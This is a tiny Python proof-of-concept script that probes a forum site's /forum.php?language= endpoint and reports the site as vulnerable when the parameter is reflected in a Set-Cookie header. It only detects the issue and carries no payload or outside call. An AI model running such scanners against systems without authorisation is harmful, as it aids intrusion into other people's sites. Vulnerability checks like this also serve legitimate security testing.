# -*- coding: utf-8 -*- 
#Author: key
#Team: Mystery Security Team
#Blog: gh0st.cn
#Email: admin@gh0st.cn
#Usage: python poc.py url

import requests,sys

def poc(url):
  u = url + "/forum.php?language="
  r = requests.get(u,allow_redirects=False,headers={"User-Agent":"Mystery Security Team"})
  if "language=" in r.headers['Set-Cookie']:
    print "{0} is vulnerable!".format(url)

if __name__ == '__main__':
  poc(sys.argv[1])